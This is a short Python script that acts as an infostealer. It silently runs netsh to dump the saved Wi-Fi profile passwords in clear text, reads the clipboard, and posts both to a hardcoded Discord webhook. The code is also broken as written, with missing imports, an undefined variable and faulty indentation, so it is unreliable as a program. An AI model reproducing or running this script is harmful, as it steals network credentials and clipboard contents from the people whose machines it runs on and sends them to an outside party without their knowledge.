import subprocess
import pyperclip

def get_networks():
    networks = {}
    
    try:
        output_networks = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"], creationflags=subprocess.CREATE_NO_WINDOW
        ).decode(errors="ignore")

        profiles = [line.split(":")[1].strip() for line in output_networks.split("\n") if "Profil" in line]

        for profile in profiles:
            if profile:
                network_info = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode(errors="ignore")

                password = extract_password(network_info)
                networks[profile] = password if password else "nopwd"

    except Exception as e:
        print(f"Error retrieving networks: {e}")

    return networks

def extract_password(network_info):
    for line in network_info.split("\n"):
        if "Key Content" in line:
            return line.split(":")[1].strip()
    return None

def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()
        return clipboard_content
    except Exception as e:
        print(f"Error retrieving clipboard content: {e}")
        return "Unable to fetch clipboard content."

if __name__ == "__main__":
    wifi_passwords = get_networks()
    clipboard_data = get_clipboard_content()


    for wifi, password in wifi_passwords.items():
        p1 = {"content":f"{wifi}: {password}"}
   
   p2 = {"content":f"Clipboard: {clipboard_data}"}
   url = "https://discord.com/api/webhooks/1347607587738222662/eZw1HDWRml4Qwz8QRf8t-u7355g8owcBpv7ptyZCysEgcuT6r_OG5ZOitLmZCCMkEwJL"
    response = requests.post(url, data=json.dumps(payload),headers={"Content-Type": "application/json"})
    response = requests.post(url, data=json.dumps(p1),headers={"Content-Type": "application/json"})